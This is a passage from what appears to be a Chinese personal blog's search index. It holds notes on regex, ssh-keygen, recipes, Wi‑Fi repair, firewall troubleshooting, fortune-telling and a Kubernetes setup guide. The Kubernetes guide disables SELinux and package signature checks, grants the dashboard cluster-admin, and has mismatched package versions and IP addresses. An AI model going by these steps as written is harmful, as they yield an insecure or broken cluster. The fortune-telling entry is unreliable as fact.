<td>正向<strong>肯定</strong>预查（匹配后面是）</td>
<td><code>a(?=b)</code> 匹配 “a” 若后是 “b”</td>
</tr>
<tr>
<td><code>(?!...)</code></td>
<td>正向<strong>否定</strong>预查（匹配后面不是）</td>
<td><code>a(?!b)</code> 匹配 “a” 若后不是 “b”</td>
</tr>
<tr>
<td><code>(?&lt;=...)</code></td>
<td>反向<strong>肯定</strong>预查（匹配前面是）</td>
<td><code>(?&lt;=a)b</code> 匹配 “b” 若前是 “a”</td>
</tr>
<tr>
<td><code>(?&lt;!...)</code></td>
<td>反向<strong>否定</strong>预查（匹配前面不是）</td>
<td><code>(?&lt;!a)b</code> 匹配 “b” 若前不是 “a”</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>代码</category>
        <category>基础信息</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>生成密钥 ssh-keygen命令</title>
    <url>/2024/08/13/%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5-ssh-keygen%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="示例">示例</h2>
<h3 id="生成一个密钥文件">生成一个密钥文件</h3>
<p>生成一个 2048 位的 RSA 密钥对，并将私钥存储在 ~/.ssh/id_rsa 中，将公钥存储在 ~/.ssh/id_rsa.pub 中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<h3 id="示例详解">示例详解</h3>
<p>-t rsa: 指定要生成的密钥类型为 RSA。RSA 是一种非对称加密算法，常用于生成 SSH 密钥对。</p>
<p>-b 2048: 指定生成的密钥的比特数。在这里，生成的密钥将有 2048 位。密钥位数越大，通常越安全，但也会增加计算负担。</p>
<p>-f ~/.ssh/id_rsa: 指定生成的密钥文件的路径。在这里，生成的私钥将存储在 ~/.ssh/id_rsa 文件中，而公钥则存储在 ~/.ssh/id_rsa.pub 文件中。这是默认的文件路径，可以根据需要指定其他路径。</p>
<h2 id="参数表格">参数表格</h2>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-b</td>
<td style="text-align:left">指定密钥长度；</td>
</tr>
<tr>
<td style="text-align:center">-e</td>
<td style="text-align:left">读取openssh的私钥或者公钥文件；</td>
</tr>
<tr>
<td style="text-align:center">-C</td>
<td style="text-align:left">添加注释；</td>
</tr>
<tr>
<td style="text-align:center">-f</td>
<td style="text-align:left">指定用来保存密钥的文件名；</td>
</tr>
<tr>
<td style="text-align:center">-i</td>
<td style="text-align:left">读取未加密的ssh-v2兼容的私钥/公钥文件，然后在标准输出设备上显示openssh兼容的私钥/公钥；</td>
</tr>
<tr>
<td style="text-align:center">-l</td>
<td style="text-align:left">显示公钥文件的指纹数据；</td>
</tr>
<tr>
<td style="text-align:center">-N</td>
<td style="text-align:left">提供一个新密语；</td>
</tr>
<tr>
<td style="text-align:center">-P</td>
<td style="text-align:left">提供（旧）密语；</td>
</tr>
<tr>
<td style="text-align:center">-q</td>
<td style="text-align:left">静默模式；</td>
</tr>
<tr>
<td style="text-align:center">-t</td>
<td style="text-align:left">指定要创建的密钥类型。</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>滑蛋饭</title>
    <url>/2025/05/15/%E6%BB%91%E8%9B%8B%E9%A5%AD/</url>
    <content><![CDATA[<h2 id="调料">调料</h2>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:left">量</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">蚝油</td>
<td style="text-align:left">适量</td>
</tr>
<tr>
<td style="text-align:center">糖</td>
<td style="text-align:left">适量</td>
</tr>
<tr>
<td style="text-align:center">胡椒粉</td>
<td style="text-align:left">适量</td>
</tr>
<tr>
<td style="text-align:center">香油</td>
<td style="text-align:left">极少量</td>
</tr>
<tr>
<td style="text-align:center">酱油</td>
<td style="text-align:left">少量</td>
</tr>
<tr>
<td style="text-align:center">鸡精</td>
<td style="text-align:left">少量</td>
</tr>
<tr>
<td style="text-align:center">生粉</td>
<td style="text-align:left">适量</td>
</tr>
</tbody>
</table>
<h2 id="酱汁">酱汁</h2>
<ol>
<li>半碗水，加入耗油，糖，喜欢甜可以多一点糖，白胡椒，搅在一起</li>
<li>差不多出锅的时候放一点酱油，香油</li>
<li>最后用生粉调一个芡，冒泡即可</li>
</ol>
<h2 id="滑蛋">滑蛋</h2>
<p>小火煎蛋即可，腊肠韭黄，都可以，按喜欢的放。</p>
]]></content>
      <categories>
        <category>生活</category>
        <category>菜谱</category>
      </categories>
      <tags>
        <tag>菜谱</tag>
      </tags>
  </entry>
  <entry>
    <title>笔记本无线网卡异常</title>
    <url>/2025/03/22/%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<h2 id="问题现象">问题现象</h2>
<p>这次遇到的问题现象是一开始网卡会时不时异常，通过重启和去除静电的方法会恢复正常，但是突然有一天就开始无法恢复了，始终保持异常的状态，怎么重新安装驱动都没用。</p>
<p>但是主机是一直有识别到网卡的，设备管理显示黄色告警。</p>
<h2 id="解决办法">解决办法</h2>
<h3 id="拆机拔插网卡">拆机拔插网卡</h3>
<p>网卡拆下来用纸巾擦干净，或者酒精，重新安装即恢复</p>
<p><s>原本是一直用手机usb共享网络使用网络了，但是有一天突然想到小时候的小霸王游戏卡都是擦擦金手指解决的， 尝试后没想到真有用</s></p>
<blockquote>
<p>这个是我这次的问题解决办法，正常解决途径有以下方法</p>
</blockquote>
<h3 id="去除静电">去除静电</h3>
<ol>
<li>拔掉电脑上所有的线</li>
<li>启动键一直按，按到关机后再按20秒</li>
</ol>
<p>操作成功后启动我的联想y7000键盘灯会是熄灭的</p>
<h3 id="更新-重新下载网卡驱动">更新/重新下载网卡驱动</h3>
<ul>
<li>使用intel网卡驱动自动检测下载工具</li>
</ul>
<blockquote>
<p>下载地址：<br>
<a href="https://www.intel.cn/content/www/cn/zh/download/19351/intel-wireless-wi-fi-drivers-for-windows-10-and-windows-11.html">https://www.intel.cn/content/www/cn/zh/download/19351/intel-wireless-wi-fi-drivers-for-windows-10-and-windows-11.html</a><br>
其他驱动：<br>
<a href="https://www.intel.cn/content/www/cn/zh/download-center/home.html">https://www.intel.cn/content/www/cn/zh/download-center/home.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>笔记本维修</category>
      </categories>
      <tags>
        <tag>笔记本无线网卡</tag>
        <tag>维修</tag>
      </tags>
  </entry>
  <entry>
    <title>简单部署k8s</title>
    <url>/2024/08/15/%E7%AE%80%E5%8D%95%E9%83%A8%E7%BD%B2k8s/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><s>初次学习，理解并不是很清楚</s></p>
</div>
<hr>
<h2 id="准备环境">准备环境</h2>
<h3 id="服务器规划：">服务器规划：</h3>
<table>
<thead>
<tr>
<th style="text-align:center">角色</th>
<th style="text-align:center">IP地址</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">k8s-master</td>
<td style="text-align:center">192.168.11.130</td>
</tr>
<tr>
<td style="text-align:center">k8s-node1</td>
<td style="text-align:center">192.168.11.134</td>
</tr>
<tr>
<td style="text-align:center">k8s-node2</td>
<td style="text-align:center">192.168.11.135</td>
</tr>
</tbody>
</table>
<h3 id="服务器要求：">服务器要求：</h3>
<p>建议最小硬件配置：2核CPU、2G内存、20G硬盘。<br>
服务器可以访问互联网，会联网下载镜像。<br>
软件环境：</p>
<table>
<thead>
<tr>
<th style="text-align:center">软件</th>
<th style="text-align:center">版本</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">操作系统</td>
<td style="text-align:center">CentOS7.9_x64</td>
</tr>
<tr>
<td style="text-align:center">Docker</td>
<td style="text-align:center">24.0.0（CE）</td>
</tr>
<tr>
<td style="text-align:center">Kubernetes</td>
<td style="text-align:center">1.28</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="初始化配置">初始化配置</h2>
<h3 id="关闭-Selinux">关闭 Selinux</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s/enforcing/disabled/&#x27; /etc/selinux/config # 永久</span><br><span class="line">setenforce 0 # 临时</span><br></pre></td></tr></table></figure>
<h3 id="关闭-Swap">关闭 Swap</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swapoff -a # 临时</span><br><span class="line">sed -ri &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab # 永久</span><br></pre></td></tr></table></figure>
<h3 id="设置主机名">设置主机名</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname k8s-master</span><br></pre></td></tr></table></figure>
<h3 id="确保网络桥接的数据包经过-Iptables-处理，启用相关的内核参数">确保网络桥接的数据包经过 Iptables 处理，启用相关的内核参数</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/sysctl.d/k8s.conf &lt;&lt; EOF</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">EOF</span><br><span class="line">sysctl --system # 生效</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="安装-Docker">安装 Docker</h2>
<h3 id="下载安装">下载安装</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo</span><br><span class="line">yum -y install docker-ce</span><br><span class="line">systemctl enable docker &amp;&amp; systemctl start docker</span><br></pre></td></tr></table></figure>
<h3 id="配置镜像下载加速器和设置-Cgroup-驱动">配置镜像下载加速器和设置 Cgroup 驱动</h3>
<p>这一步可以参考最新的docker可用镜像源设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt; EOF</span><br><span class="line"> &#123;</span><br><span class="line"> &quot;registry-mirrors&quot;: [&quot;https://b9pmyelo.mirror.aliyuncs.com&quot;],</span><br><span class="line"> &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]</span><br><span class="line"> &#125;</span><br><span class="line">EOF</span><br><span class="line">systemctl restart docker</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure>
<h3 id="安装-cri-dockerd（Docker-与-Kubernetes-通信的中间程序）">安装 cri-dockerd（Docker 与 Kubernetes 通信的中间程序）</h3>
<p>测试最新版本0.3.15安装在centos7.9缺少依赖，但是显示的依赖包已安装，安装旧一版本0.3.14没什么问题，可能版本和我最简的centos7.9有些问题，下载地址为：<br>
<a href="https://github.com/Mirantis/cri-dockerd/releases">https://github.com/Mirantis/cri-dockerd/releases</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/Mirantis/cri-dockerd/releases/download/v0.3.14/cri-dockerd-0.3.14-3.el7.x86_64.rpm</span><br><span class="line">rpm -ivh cri-dockerd-0.3.2-3.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h3 id="指定依赖镜像地址为国内镜像地址：">指定依赖镜像地址为国内镜像地址：</h3>
<p>修改ExecStart=/usr/bin/cri-dockerd --container-runtime-endpoint fd://部分，添加以下参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /usr/lib/systemd/system/cri-docker.service</span><br><span class="line">ExecStart=/usr/bin/cri-dockerd --container-runtime-endpoint fd:// --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.9</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable cri-docker &amp;&amp; systemctl start cri-docker</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="部署-Kubernetes-集群">部署 Kubernetes 集群</h2>
<h3 id="添加阿里云-YUM-软件源">添加阿里云 YUM 软件源</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/yum.repos.d/kubernetes.repo &lt;&lt; EOF</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">repo_gpgcheck=0</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.ali</span><br><span class="line">yun.com/kubernetes/yum/doc/rpm-package-key.gpg</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<h3 id="安装-kubeadm，kubelet-和-kubectl">安装 kubeadm，kubelet 和 kubectl</h3>
<p>我一般默认安装最新版yum install -y kubelet kubeadm kubectl，这里我指定下版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y kubelet-1.28.2 kubeadm-1.28.2 kubectl-1.28.2</span><br><span class="line">systemctl enable kubelet</span><br></pre></td></tr></table></figure>
<h3 id="初始化-Master-节点">初始化 Master 节点</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm init \</span><br><span class="line">--apiserver-advertise-address=192.168.11.128 \</span><br><span class="line">--image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">--kubernetes-version v1.28.2 \</span><br><span class="line">--service-cidr=10.96.0.0/12 \</span><br><span class="line">--pod-network-cidr=10.244.0.0/16 \</span><br><span class="line">--cri-socket=unix:///var/run/cri-dockerd.sock</span><br></pre></td></tr></table></figure>
<p>初始化完成后，根据提示信息，拷贝 kubectl 工具认证文件到默认路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure>
<p>使用 kubectl 工具查看节点状态：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get nodes</span><br></pre></td></tr></table></figure>
<p>ps:由于网络插件还没有部署，节点会处于“NotReady”状态</p>
<h3 id="将-Node-节点加入集群">将 Node 节点加入集群</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm join 192.168.11.130:6443 --token pt332w.pz2sldn46h9ynfsw         --discovery-token-ca-cert-hash sha256:b6bdbc14bee762e5a7cfc24aa60cc842077180ae6595eb68b09d0333243cfa0c --cri-socket=unix:///var/run/cri-dockerd.sock</span><br></pre></td></tr></table></figure>
<h3 id="安装网络组件">安装网络组件</h3>
<p>Pod 网络:Kubernetes 需要一个 Pod 网络插件来管理集群中的网络通信。你可以选择一个适合你环境的网络插件（如 Flannel、Calico、Weave 等），并使用 kubectl 命令来部署。</p>
<p>这里使用 Calico 作为 Kubernetes 的网络插件，负责集群中网络通信。<br>
创建 Calico 网络组件的资源：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f https://docs.projectcalico.org/manifests/calico.yaml</span><br></pre></td></tr></table></figure>
<p>配置安全策略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim network-policy.yaml</span><br><span class="line"></span><br><span class="line">apiVersion: networking.k8s.io/v1</span><br><span class="line">kind: NetworkPolicy</span><br><span class="line">metadata:</span><br><span class="line">  name: allow-all</span><br><span class="line">  namespace: default</span><br><span class="line">spec:</span><br><span class="line">  podSelector: &#123;&#125;</span><br><span class="line">  policyTypes:</span><br><span class="line">  - Ingress</span><br><span class="line">  - Egress</span><br><span class="line">  ingress:</span><br><span class="line">  - &#123;&#125;</span><br><span class="line">  egress:</span><br><span class="line">  - &#123;&#125;</span><br><span class="line"></span><br><span class="line">kubectl apply -f network-policy.yaml</span><br></pre></td></tr></table></figure>
<p>应用完成后，等待 5 分钟后，查看 Pod 运行状态：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get pods -n kube-system</span><br></pre></td></tr></table></figure>
<p>如果出现问题，可能是还未下载完，也可以查看日志排查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl logs -n kube-system &lt;pod-name&gt;</span><br></pre></td></tr></table></figure>
<p>ps：如果 Pod 处于“ContainerCreating”状态说明在下载镜像中，需耐心等待</p>
<h2 id="安装-Dashboard">安装 Dashboard</h2>
<p>Dashboard 是官方提供的一个 UI，可用于基本管理 K8s 资源。</p>
<h3 id="安装">安装</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f kubernetes-dashboard.yaml</span><br><span class="line">kubectl get pods -n kubernetes-dashboard</span><br></pre></td></tr></table></figure>
<p>浏览器访问“https://&lt;节点 IP 地址&gt;:30001”，将看到 Dashboard 登录界面。</p>
<h3 id="创建服务账号并授权管理员权限：">创建服务账号并授权管理员权限：</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建用户</span><br><span class="line">kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard</span><br><span class="line"># 用户授权</span><br><span class="line">kubectl create clusterrolebinding dashboard-admin --clusterrole=cluster-admin --</span><br><span class="line">serviceaccount=kubernetes-dashboard:dashboard-admin</span><br><span class="line"># 获取用户 Token</span><br><span class="line">kubectl create token dashboard-admin -n kubernetes-dashboard</span><br></pre></td></tr></table></figure>
<p>使用输出的 Token 登录 Dashboard，将进入到首页<br>
至此，k8s部署完成</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>k8s</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>算命</title>
    <url>/2025/02/05/%E7%AE%97%E5%91%BD/</url>
    <content><![CDATA[<h2 id="六神">六神</h2>
<h3 id="手势位置">手势位置</h3>
<p>左手三指，分别是大安、流连、速喜、赤口、小吉、空亡<br>
<img src="/images/pasted-71.png" alt="upload successful"></p>
<p>速记：大、流、速、赤、小、空。</p>
<h3 id="详解">详解</h3>
<h4 id="大安">大安</h4>
<p>1、身不动时（如果算一个人在干什么）<br>
2、五行：属木<br>
3、方位：东<br>
4、神煞：青龙<br>
5、数字：1、5、7<br>
6、安心吉祥的意思</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大安事事昌</span><br><span class="line">求谋在东方</span><br><span class="line">失物去不远</span><br><span class="line">宅家保平安</span><br><span class="line">行人身未动</span><br><span class="line">病者主无妨</span><br><span class="line">将军回田野</span><br><span class="line">仔细更推详</span><br></pre></td></tr></table></figure>
<h4 id="留连">留连</h4>
<p>1、人未归时<br>
2、五行属水<br>
3、黑色<br>
4、方位北<br>
5、玄武<br>
6、数字：2、8、10<br>
7、有暗昧不明、延迟、纠缠、拖延、漫长之意</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">留连事难成</span><br><span class="line">求谋日未明</span><br><span class="line">官事凡宜缓</span><br><span class="line">去者未回程</span><br><span class="line">失物南方见</span><br><span class="line">急讨方心称</span><br><span class="line">更须防口舌</span><br><span class="line">人口且平平</span><br></pre></td></tr></table></figure>
<h4 id="速喜">速喜</h4>
<p>1、人即至时<br>
2、五行属火<br>
3、红色<br>
4、方位为南方<br>
5、数字：3,6,9<br>
6、有快速、吉利、时机已到之意</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">速喜喜来临</span><br><span class="line">求财向南行</span><br><span class="line">失物申未午（南、西南）</span><br><span class="line">逢人路上寻</span><br><span class="line">官事有福德</span><br><span class="line">病者无祸侵</span><br><span class="line">田宅六畜吉</span><br><span class="line">行人有信音</span><br></pre></td></tr></table></figure>
<h4 id="赤口">赤口</h4>
<p>1、官事凶时<br>
2、五行属金<br>
3、白色<br>
4、西方<br>
5、白虎<br>
6、数字：4，7，10<br>
7、有不吉、惊恐、凶险、口舌是非之意</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">赤口主口舌</span><br><span class="line">官非切宜防</span><br><span class="line">失物急去寻</span><br><span class="line">行人有惊慌</span><br><span class="line">鸡犬（六畜）多作怪</span><br><span class="line">病者出西方</span><br><span class="line">更须防咀咒</span><br><span class="line">诚恐染瘟皇</span><br></pre></td></tr></table></figure>
<h4 id="小吉">小吉</h4>
<p>1、人来喜时<br>
2、五行属木<br>
3、六合<br>
4、数字：1,5,7<br>
5、有和合、吉利之意</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小吉最吉昌</span><br><span class="line">路上好商量</span><br><span class="line">阴人来报喜</span><br><span class="line">失物在坤方（西南）</span><br><span class="line">行人即便至</span><br><span class="line">交易甚是强</span><br><span class="line">凡事皆和合</span><br><span class="line">病者祈上苍</span><br></pre></td></tr></table></figure>
<h4 id="空亡">空亡</h4>
<p>1、音信稀时<br>
2、五行属土<br>
3、黄色<br>
4、中央<br>
5、勾陈<br>
6、数字：3,6,9<br>
7、有不吉、无果之意</p>
<p>口诀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空亡事不祥</span><br><span class="line">阴人多乖张</span><br><span class="line">求财无利益</span><br><span class="line">行人有灾殃</span><br><span class="line">失物寻一见</span><br><span class="line">官事有刑伤</span><br><span class="line">病人逢暗鬼</span><br><span class="line">祈解保安康</span><br></pre></td></tr></table></figure>
<h2 id="奇门">奇门</h2>
<h3 id="九宫五行">九宫五行</h3>
<p>五行生克关系<br>
<img src="/images/pasted-74.png" alt="upload successful"><br>
九宫位置<br>
<img src="/images/pasted-73.png" alt="upload successful"><br>
东南西北位置<br>
<img src="/images/pasted-75.png" alt="upload successful"></p>
<h2 id="干支">干支</h2>
<p>甲乙东方木，丙丁南方火，戊己中央土，庚辛西方金，壬癸北方水</p>
<p>寅卯为木居东方，巳午为火居正南，<br>
申酉属金位在西，子亥属水在北边，<br>
辰戌丑未皆属土，分别居于四维偏，<br>
辰在东南戌西北，丑在东北未西南。</p>
<h2 id="时辰">时辰</h2>
<p>子丑寅卯辰巳午未申酉戌亥</p>
]]></content>
      <categories>
        <category>生活</category>
        <category>玄学</category>
      </categories>
      <tags>
        <tag>算命知识</tag>
        <tag>小六壬</tag>
      </tags>
  </entry>
  <entry>
    <title>羊肉火锅-牛油辣味</title>
    <url>/2025/02/04/%E7%BE%8A%E8%82%89%E7%81%AB%E9%94%85-%E7%89%9B%E6%B2%B9%E8%BE%A3%E5%91%B3/</url>
    <content><![CDATA[<h2 id="配料">配料</h2>
<p>配料表中的量不包括焯水等步骤的损耗</p>
<style>
table th:nth-of-type(1) {
width: 20%;
}
</style>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:left">量</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">羊肉</td>
<td style="text-align:left">一到两斤左右</td>
</tr>
<tr>
<td style="text-align:center">花椒</td>
<td style="text-align:left">可放可不放</td>
</tr>
<tr>
<td style="text-align:center">香叶</td>
<td style="text-align:left">3片左右</td>
</tr>
<tr>
<td style="text-align:center">桂皮</td>
<td style="text-align:left">一小块</td>
</tr>
<tr>
<td style="text-align:center">八角</td>
<td style="text-align:left">一个</td>
</tr>
<tr>
<td style="text-align:center">干辣椒</td>
<td style="text-align:left">若干</td>
</tr>
<tr>
<td style="text-align:center">大葱</td>
<td style="text-align:left">三段</td>
</tr>
<tr>
<td style="text-align:center">姜</td>
<td style="text-align:left">适量</td>
</tr>
<tr>
<td style="text-align:center">大蒜</td>
<td style="text-align:left">适量（半颗左右）</td>
</tr>
<tr>
<td style="text-align:center">白萝卜</td>
<td style="text-align:left">随意</td>
</tr>
<tr>
<td style="text-align:center">海底捞牛油火锅底料</td>
<td style="text-align:left">小包的半包</td>
</tr>
</tbody>
</table>
<h2 id="步骤">步骤</h2>
<p>1、一点姜、葱、料酒给羊肉焯水，撇去浮沫后捞出备用</p>
<p>2、热油炒香姜、大葱、大蒜、和香料，然后倒入火锅底料翻炒均匀，可加入白胡椒，但是感觉没啥区别</p>
<p>3、加入羊肉翻炒均匀后加水煮90分钟，中途加入萝卜（可高压锅煮45分钟）</p>
]]></content>
      <categories>
        <category>生活</category>
        <category>菜谱</category>
      </categories>
      <tags>
        <tag>菜谱</tag>
        <tag>羊肉火锅</tag>
      </tags>
  </entry>
  <entry>
    <title>莴笋炒腊肠</title>
    <url>/2025/02/10/%E8%8E%B4%E7%AC%8B%E7%82%92%E8%85%8A%E8%82%A0/</url>
    <content><![CDATA[<h2 id="配料">配料</h2>
<style>
table th:nth-of-type(1) {
width: 20%;
}
</style>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:left">量</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">莴笋</td>
<td style="text-align:left">一根</td>
</tr>
<tr>
<td style="text-align:center">腊肠</td>
<td style="text-align:left">两根</td>
</tr>
<tr>
<td style="text-align:center">大蒜</td>
<td style="text-align:left">4-5瓣</td>
</tr>
<tr>
<td style="text-align:center">姜</td>
<td style="text-align:left">适量</td>
</tr>
<tr>
<td style="text-align:center">干辣椒</td>
<td style="text-align:left">三个</td>
</tr>
<tr>
<td style="text-align:center">鸡精</td>
<td style="text-align:left">适量</td>
</tr>
<tr>
<td style="text-align:center">盐</td>
<td style="text-align:left">少</td>
</tr>
<tr>
<td style="text-align:center">糖</td>
<td style="text-align:left">少</td>
</tr>
<tr>
<td style="text-align:center">酱油</td>
<td style="text-align:left">适量</td>
</tr>
<tr>
<td style="text-align:center">蚝油</td>
<td style="text-align:left">适量</td>
</tr>
<tr>
<td style="text-align:center">香油</td>
<td style="text-align:left">适量</td>
</tr>
</tbody>
</table>
<h2 id="步骤">步骤</h2>
<ol>
<li>腊肠如果太硬焯水，或者泡水，切片；莴笋切片；姜切丝；干辣椒切段；蒜剥皮随便剁两下；</li>
<li>油烧热炒腊肠微微黄即可；</li>
<li>加姜丝、蒜、干辣椒，炒香后倒入莴笋；</li>
<li>翻炒几下加少量水；加入所有调味料，香油出锅前加入翻炒几下即可。</li>
</ol>
]]></content>
      <categories>
        <category>生活</category>
        <category>菜谱</category>
      </categories>
      <tags>
        <tag>菜谱</tag>
      </tags>
  </entry>
  <entry>
    <title>过防火墙业务端口畅通但业务异常-云虚拟网络</title>
    <url>/2025/01/19/%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AB%AF%E5%8F%A3%E7%95%85%E9%80%9A%E4%BD%86%E4%B8%9A%E5%8A%A1%E5%BC%82%E5%B8%B8-%E4%BA%91%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<h2 id="通话语音服务过防火墙异常">通话语音服务过防火墙异常</h2>
<h3 id="现象">现象</h3>
<p>网络双向畅通；<br>
业务服务为语音服务时，仅能单向沟通，也就是只能听到声音但是无法输出；<br>
通过抓包检查，输出的数据包未能到达服务器。</p>
<h3 id="解决方法">解决方法</h3>
<p><code>检查防火墙的应用层网关ALG功能，该部分会有部分协议不转发，而语音服务使用的时SIP，开启即可</code></p>
<ul>
<li>而且防火墙未开启sip转发也是很正常的，所以当有语音服务过墙时，如果异常最好也同样检查一下是否有开启SIP。</li>
<li>语音服务的厂家也反馈，该问题常常出现。</li>
</ul>
<hr>
<h2 id="端口畅通但部分业务无法使用">端口畅通但部分业务无法使用</h2>
<h3 id="现象-2">现象</h3>
<blockquote>
<p>以下场景均可能为相同问题：</p>
</blockquote>
<ol>
<li>堡垒机登录web正常，但无法远程主机;</li>
<li>端口访问正常，业务部分正常，部分异常。</li>
</ol>
<h3 id="解决方法-2">解决方法</h3>
<p><code>检查路由发现，堡垒机到远程主机之间为不同子网，主机路由下一跳网关为防火墙，堡垒机则不是，导致防火墙上只有半个会话，来回路径不一致</code></p>
<ol>
<li>添加明细路由内网流量不经过防火墙；</li>
<li>不建议选择这个方法，修改路由让防火墙会话完整，来回一致。</li>
</ol>
<hr>
<h2 id="传输大文件时失败">传输大文件时失败</h2>
<h3 id="现象-3">现象</h3>
<p>经过防火墙时，传输稍微大一点的文件发现无法传输；</p>
<p>其他如果是因为工具限制或者协议限制的情况不考虑，这些比较好判断。</p>
<h3 id="解决方法-3">解决方法</h3>
<p><code>可能是因为MTU设置太小导致的，数据帧大于MTU被丢弃</code></p>
<ul>
<li>调整MTU大小即可</li>
</ul>
]]></content>
      <categories>
        <category>防火墙排障经验</category>
      </categories>
      <tags>
        <tag>防火墙</tag>
        <tag>排障</tag>
      </tags>
  </entry>
  <entry>
    <title>防火墙firewall和iptables命令</title>
    <url>/2024/08/11/%E9%98%B2%E7%81%AB%E5%A2%99firewall%E5%92%8Ciptables%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="firewall">firewall</h2>
<h3 id="防火墙管理操作">防火墙管理操作</h3>
<table>
<thead>
<tr>
<th style="text-align:center">命令功能</th>
<th style="text-align:left">命令</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">启动 firewalld.service服务</td>
<td style="text-align:left">service firewalld start</td>
</tr>
<tr>
<td style="text-align:center">停止firewalld.service服务</td>
<td style="text-align:left">service firewalld stop</td>
</tr>
<tr>
<td style="text-align:center">重启firewalld.service服务</td>
